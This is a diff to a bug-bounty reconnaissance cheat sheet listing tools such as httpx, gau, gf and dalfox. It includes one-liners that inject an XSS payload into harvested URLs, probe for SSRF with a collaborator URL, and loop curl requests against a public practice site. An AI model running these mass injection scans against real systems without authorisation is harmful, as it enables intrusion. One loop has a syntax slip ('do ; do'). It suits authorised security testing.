@@ -42,7 +42,7 @@ Recon for Bugbounty
 
       AquaTone Article - https://www.geeksforgeeks.org/aquatone-tool-for-domain-flyovers/
 
-      httpx
+      httpx toolkit
       gau
       gf
       dalfox
@@ -50,7 +50,7 @@ Recon for Bugbounty
       uniscan
       
 
-httpx -mc 200 -l url.txt
+httpx-toolkit -mc 200 -l url.txt
 
 httpx -mc 200 -sc -tech -title -ip -probe -l url.txt
 
@@ -82,3 +82,14 @@ cat url.txt | gf xss | grep 'source=' | qsreplace '"><script>confirm(1)</script>
 
 SSRF
 findomain -t domain.com -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://BurpCollabratorURL
+
+
+
+
+
+
+echo "testphp.vulnweb.com" | waybackurls | tee testphp.txt
+
+cat testphp.txt | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt
+
+cat testxss.txt | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host  \033[31m{Vulnerable\n}"; done
